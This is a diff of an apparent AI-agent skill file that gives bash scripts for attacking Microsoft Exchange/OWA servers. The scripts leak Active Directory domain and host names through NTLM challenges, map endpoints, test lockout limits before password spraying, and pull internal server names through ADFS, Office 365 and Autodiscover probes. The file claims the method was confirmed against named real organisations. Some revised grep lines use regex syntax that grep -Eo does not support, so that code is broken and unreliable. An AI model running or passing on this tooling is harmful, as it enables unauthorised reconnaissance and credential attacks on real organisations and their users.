@@ -1,24 +1,22 @@
 ---
 name: exchange-owa-attack
 description: Exchange/OWA NTLM AD leak, spray attack when mail subdomain.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, exchange, OWA, NTLM, ActiveDirectory, password-spray]
-    category: recon
-    related_skills:
-      - port-service-discovery
-      - zimbra-attack
-      - subdomain-enumeration
+compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
+tags: [recon, exchange, OWA, NTLM, ActiveDirectory, password-spray]
+category: recon
+related_skills:
+  - port-service-discovery
+  - zimbra-attack
+  - subdomain-enumeration
 ---
 
 # Exchange/OWA Attack Skill
 
-Exchange Outlook Web Access (OWA) reconnaissance — NTLM Type-2 challenge decoding for AD domain/computer name extraction, OWA endpoint mapping, password spray surface assessment, and version fingerprinting for known CVEs. Confirmed on Mairie Monaco (Exchange 2019 CU15, AD domain MAIRIE.local), ENACOM Argentina (Exchange 2016, domain CNC.INTER), realpro.com (OWA + Exchange servers), and Panco (ADFS + Office 365).
+Exchange Outlook Web Access (OWA) reconnaissance — NTLM Type-2 challenge decoding for AD domain/computer name extraction, OWA endpoint mapping, password spray surface assessment, and version fingerprinting for known CVEs. Confirmed on Mairie Monaco (Exchange 2019 CU15, AD domain MAIRIE.local), ENACOM Argentina (Exchange 2016, domain CNC.INTER), realestate.example.com (OWA + Exchange servers), and Panco (ADFS + Office 365).
 
 ## When to Use
 
@@ -30,7 +28,7 @@ Exchange Outlook Web Access (OWA) reconnaissance — NTLM Type-2 challenge decod
 
 ## Prerequisites
 
-- `terminal` tool with curl, python3.
+- `terminal` with curl, python3.
 - Target Exchange/OWA URL.
 - For password spray: list of usernames (from recon) and password candidates.
 
@@ -38,10 +36,10 @@ Exchange Outlook Web Access (OWA) reconnaissance — NTLM Type-2 challenge decod
 
 ```bash
 # Quick Exchange detection
-curl -skI "https://TARGET/owa/" | grep -iE "x-owa-version|x-feserver|exchange|microsoft"
+curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/owa/" | grep -iE "x-owa-version|x-feserver|exchange|microsoft"
 
 # NTLM challenge capture (AD domain leak)
-curl -skI "https://TARGET/owa/" -H "Authorization: Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" | grep -i "www-authenticate"
+curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/owa/" -H "Authorization: Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" | grep -i "www-authenticate"
 ```
 
 ## Quick Reference
@@ -64,13 +62,13 @@ curl -skI "https://TARGET/owa/" -H "Authorization: Negotiate TlRMTVNTUAABAAAAB4I
 
 ```bash
 TARGET="$1"
-OUTDIR="/root/output/exchange"
+OUTDIR="$OUTDIR/exchange"
 mkdir -p "$OUTDIR"
 
 echo "[*] Exchange detection on $TARGET"
 
 # OWA probe
-OWA_RESP=$(curl -skI --max-time 10 "https://$TARGET/owa/" 2>/dev/null)
+OWA_RESP=$(curl -skI --max-time 10 --connect-timeout 10 "https://$TARGET/owa/" 2>/dev/null)
 echo "$OWA_RESP" > "$OUTDIR/owa_headers.txt"
 
 # Version extraction
@@ -107,7 +105,7 @@ EX_ENDPOINTS["/owa/healthcheck.htm"]="Health check"
 echo ""
 echo "[*] Endpoint probe:"
 for ep in "${!EX_ENDPOINTS[@]}"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET$ep")
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET$ep")
   [[ "$code" == "200" ]] && echo "  [OPEN] $ep — ${EX_ENDPOINTS[$ep]}"
   [[ "$code" == "302" ]] && echo "  [REDIR] $ep — ${EX_ENDPOINTS[$ep]}"
   [[ "$code" == "401" ]] && echo "  [AUTH] $ep — ${EX_ENDPOINTS[$ep]}"
@@ -122,7 +120,7 @@ TARGET="$1"
 echo "[*] NTLM challenge capture from $TARGET"
 
 # Send NTLM Type-1 (Negotiate) message via Authorization header
-NTLM_RESP=$(curl -skI --max-time 10 "https://$TARGET/owa/" \
+NTLM_RESP=$(curl -skI --max-time 10 --connect-timeout 10 "https://$TARGET/owa/" \
   -H "Authorization: Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" 2>/dev/null)
 
 WWW_AUTH=$(echo "$NTLM_RESP" | grep -i "www-authenticate: negotiate" | sed 's/.*negotiate //i' | tr -d '\r\n ')
@@ -197,21 +195,21 @@ echo "[*] Password spray surface assessment"
 # Check for account lockout by testing rapid logins with invalid password
 echo "[*] Rate limiting test (5 rapid attempts with wrong password)..."
 for i in $(seq 1 5); do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 --connect-timeout 10 \
     -X POST "https://$TARGET/owa/auth.owa" \
     -d "destination=https://$TARGET/owa/&username=testuser$i@domain.com&password=WrongPass123!" 2>/dev/null)
   echo "  Attempt $i: HTTP $code"
 done
 
 # Check if Basic Auth is enabled (rare post-2022, but exists)
-BASIC_AUTH=$(curl -skI --max-time 5 "https://$TARGET/owa/" \
+BASIC_AUTH=$(curl -skI --max-time 5 --connect-timeout 5 "https://$TARGET/owa/" \
   -H "Authorization: Basic dGVzdDp0ZXN0" 2>/dev/null | grep -i "www-authenticate.*basic")
 if [[ -n "$BASIC_AUTH" ]]; then
   echo "  [!] Basic Auth ENABLED — easier brute force vector"
 fi
 
 # Check healthcheck endpoint (sometimes exposes version/config)
-HEALTH=$(curl -sk --max-time 5 "https://$TARGET/owa/healthcheck.htm" 2>/dev/null)
+HEALTH=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/owa/healthcheck.htm" 2>/dev/null)
 if [[ -n "$HEALTH" ]] && echo "$HEALTH" | grep -qi "200 ok"; then
   echo "  [+] Healthcheck accessible — server status exposed"
 fi
@@ -226,23 +224,23 @@ echo "[*] ADFS/Office 365 recon on $TARGET_DOMAIN"
 
 # Check for ADFS
 ADFS_URL="https://sts.$TARGET_DOMAIN/adfs/ls/IdpInitiatedSignOn.aspx"
-ADFS_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$ADFS_URL")
+ADFS_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "$ADFS_URL")
 [[ "$ADFS_CODE" == "200" || "$ADFS_CODE" == "302" ]] && echo "  [+] ADFS: $ADFS_URL (HTTP $ADFS_CODE)"
 
 # Check Office 365 tenant
-O365_XML=$(curl -sk --max-time 5 "https://login.microsoftonline.com/getuserrealm.srf?login=user@$TARGET_DOMAIN&xml=1" 2>/dev/null)
+O365_XML=$(curl -sk --max-time 5 --connect-timeout 5 "https://login.microsoftonline.com/getuserrealm.srf?login=user@$TARGET_DOMAIN&xml=1" 2>/dev/null)
 if echo "$O365_XML" | grep -qi "Federated\|Managed"; then
-  echo "  [+] Office 365 tenant: $(echo "$O365_XML" | grep -oP '<NameSpaceType>\K[^<]+')"
-  echo "  $(echo "$O365_XML" | grep -oP '<DomainName>\K[^<]+')"
+  echo "  [+] Office 365 tenant: $(echo "$O365_XML" | grep -Eo '<NameSpaceType>\K[^<]+')"
+  echo "  $(echo "$O365_XML" | grep -Eo '<DomainName>\K[^<]+')"
 fi
 
 # Autodiscover (leaks internal server names)
-AUTODISCOVER=$(curl -sk --max-time 10 "https://autodiscover.$TARGET_DOMAIN/autodiscover/autodiscover.xml" \
+AUTODISCOVER=$(curl -sk --max-time 10 --connect-timeout 10 "https://autodiscover.$TARGET_DOMAIN/autodiscover/autodiscover.xml" \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>user@'$TARGET_DOMAIN'</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>' 2>/dev/null)
 if echo "$AUTODISCOVER" | grep -qi "server\|internal"; then
   echo "  [+] Autodiscover response — internal server names leaked"
-  echo "$AUTODISCOVER" | grep -oP '(?:<Server>|<InternalRpcClientServer>|<ASUrl>)[^<]+' | head -5
+  echo "$AUTODISCOVER" | grep -Eo '(?:<Server>|<InternalRpcClientServer>|<ASUrl>)[^<]+' | head -5
 fi
 ```
 
@@ -282,3 +280,7 @@ passwords = [f"{n.capitalize()}{s}!" for n in names for s in suffixes]
 - Password spray surface: confirm NO rate limiting (5 rapid attempts all return the same HTTP code).
 - Autodiscover MUST return internal server names (not just external URLs).
 - Document: Exchange version, AD domain, NetBIOS name, computer names, rate limiting status.
+
+## Related Skills
+
+- **`password-spray-methodology`** — Universal password spray pipeline across all protocols + error code differentials
